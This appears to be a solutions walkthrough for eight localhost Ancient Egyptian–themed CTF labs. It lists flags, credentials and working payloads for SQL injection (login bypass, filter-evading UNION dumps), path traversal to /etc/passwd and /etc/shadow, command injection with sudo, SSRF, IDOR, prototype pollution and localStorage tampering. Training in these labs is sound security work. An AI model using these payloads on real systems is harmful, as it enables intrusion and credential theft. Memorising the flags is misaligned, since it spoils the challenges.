
# Solutions to Ancient Egyptian CTF Labs

This file contains step-by-step solutions to the 8 CTF challenges. Each section includes the challenge name, a short description, the URL (localhost), the flag, and how to solve it.

> ⚠️ *Note: Your browser might display a security warning; proceed by accepting the risk.*

Note that some strings are randomly generated therefore the strings in this text may not be the solution as you need to do the necessary steps to get the correct string for your session.
---

## 🔍 IDOR 1 - Storage of Ancient Egyptian Artifacts
**URL:** `http://127.0.0.1:5013`  
**Flag:** `O24{0s1r1s_m45k_r3v34ls_th3_truth}`

### Step 1 - First Half of the Flag
1. Log in with:
   - Username: `explorer`
   - Password: `tutankhamun`
2. Click any artifact and modify the `id` (MD5 hash) in the URL to: `1679091c5a880faf6fb5e6087eb1b2dc` (MD5 of the number 6).

### Step 2 - Second Half of the Flag
1. Log in again, but intercept the login request using a proxy (e.g., Burp Suite).
2. Change the `user_id` parameter to `3` to log in as the director.
3. Click "View Profile" in the footer.
4. Copy the ID string from the "Security Note": `a7f39e1cb8d542b6c9184b8374fe36a1`
5. Return to the gallery, click any artifact, and change the MD5 hash in the URL to the string. 

---

## 🌐 SSRF - The Lost Tomb of Pharaoh Amenhotep
**URL:** `http://127.0.0.1:5015`  
**Flag:** `O24{4nkh_th3_k3y_0f_l1f3_unl0ck5_7h3_s4cr3d_t0mb}`

### Steps
1. Intercept the "Check Stock" request.
2. Change the `sarcophagusAPI` parameter to an invalid value. A 4-digit port number will appear in the Papyrus message.
3. Intercept "Check Stock" again and set the API parameter to:  
   `http://localtomb:PORT/pharaoh` (replace `PORT` with the number from step 2).  
   - Get the `/pharaoh` path by visiting `http://localtomb:PORT/` and using the translator from the system error page.
4. Intercept the request for button 4. On the first line, you'll see `/pharaoh/RANDOM_STRING/secrettomb`.
5. Intercept another "Check Stock" request and set the API to:  
   `http://localtomb:PORT/pharaoh/RANDOM_STRING/secrettomb`
6. You'll receive a name. Enter this name in the **"Sacred Name Entry"** field to retrieve the flag.

---

## 🧾 IDOR 2 - The Digital Papyrus Project
**URL:** `http://127.0.0.1:5010/`  
**Flag:** `O24{4nc13nt_p4pyru5_15_4_h1dd3n_tr34sur3}`

### Steps
1. Intercept the **Download All Documents** request.
2. Change the parameter from `public` to `restricted` and the method from `GET` to `PUT`.
   - Hints:
     - "restricted" is mentioned above the “Enter the Archive” button.
     - The `PUT` hint is in a comment inside the HTML code at `/papyrus`.
3. Download and unzip the ZIP file.
4. In the terminal, use:
   ```bash
   pdfgrep -i "O24" *.pdf
   ```
   This gives fake flags (decoys).
5. Instead, use:
   ```bash
   exiftool -a -u -g1 *.pdf | grep -i "O24"
   ```
   This will show the real flag from the `author` field.

---

## 🧪 Prototype Pollution - Temple of Khnum
**URL:** `http://127.0.0.1:5011`  
**Flag:** `O24{pr0t0typ3_p0llut10n_1s_4nc13nt_m4g1c}`

### Steps
1. In the "Configure temple scanner" input box, enter:
   ```json
   {"__proto__": {"foo": "bar"}}
   ```
2. Click "Update Scanner Configuration".
3. Click "Inspect Scanner" and verify that `foo: bar` appears.
4. Check `/api/scanner/debug` in your proxy history.
5. Note the presence of the `sacred_text_translator` field.
6. Submit the payload:
   ```json
   {"__proto__": {"sacred_text_translator": "cat home/priest/eye_of_horus.txt"}}
   ```

---

## 🧬 SQL Injection - The Lost Archaeologist
**URL:** `http://127.0.0.1:5014`  
**Flag:** `O24{1nj3c10n_m4st3r_g0d}`

### Steps
1. Login bypass:
   ```sql
   ' or 1=1--
   ```
   You will get the first part of the flag: `O24{1nj3c10n_`
2. Union injection to discover tables (Note: there's a blacklist so capital and lowercase of union, select, null, from & and won't work unless in a mix):
   ```sql
   ' UnIoN sElEcT table_name, NuLl, NuLl, NuLl FrOm information_schema.tables --
   ```
3. Focus on tables: `pharaohs_secret` and `generals`
4. Dump credentials:
   ```sql
   ' UnIOn SeLeCt username, access_level, nUlL, nULL FrOm pharaohs_secret--
   ```
   Output: `khufu` / `pharaoh`
5. Login with these credentials.
6. Intercept request to the **Ancient Scroll** and use time-based or boolean SQLi to enumerate (Note: this is not the only payload that works, but the simplest you could use a wide variety of time based payload to enumerate the name):
   ```sql
   ' AND substr(name,1,1)='a' --
   ```
   Eventually, discover the name: `amuntekh`
7. Final flag: `O24{1nj3c10n_m4st3r_g0d}`

---

## 📁 Path Traversal - The Tomb of the God of Mischief
**URL:** `http://127.0.0.1:5012`  
**Flag:** `O24{p47h_7r4v3r54l_m45t3r}`

### First Challenge Payload
- `....//....//etc/passwd`

### Second Challenge Payload
- `..%2f..%2fetc%2fshadow`

### Third Challenge Payload
- `../../etc/hosts%00`

> 🗒️ Puzzle-style clues hint at traversal depth, encoding, and filenames like `passwd`, `shadow`, `hosts`, and the concept of “zero offering” (null byte).

---

## 🧙 Command Injection - Book of the Dead - Soul Path Oracle
**URL:** `http://127.0.0.1:5016/`  
**Flag:** `O24{th3_scr1b3_r3v34ls_h1dd3n_tr34sur3s}`

### Steps
1. Commands aren't reflected directly; intercept a request and send it to Burp Repeater.
2. Use payloads like (Note: $() && and others works as well):
   ```bash
   ;whoami
   ;ls
   ;cat ritual_1.log
   ;cat ritual_2.log
   ;cat ritual_3.log
   ;sudo -l
   ;sudo -u high_priest /usr/bin/cat /var/log/ritual/../../home/high_priest/sacred_scroll.txt
   ```
3. Key hints appear in ritual logs and system log responses.

---

## 🔐 Authentication - Ancient Egyptian Archives
**URL:** `http://127.0.0.1:5017`  
**Flag:** `O24{scr1b3_0f_7h3_h1dd3n_p4pyru5}`

### Steps
1. Check HTML for comments and attributes.
2. Find this in the DOM:
   ```html
   <div id="papyrus-section" data-papyrusUnlocked="false">
   Your current userRank is: free_user
   ```
3. In the browser console, run:
   ```javascript
   localStorage.setItem('userRank', 'royal_scribe');
   localStorage.setItem('papyrusUnlocked', 'true');
   ```
4. You can also use `scribe` or `pharaoh` instead of `royal_scribe`.

---

🎉 Good luck on your journey through Ancient Egypt!
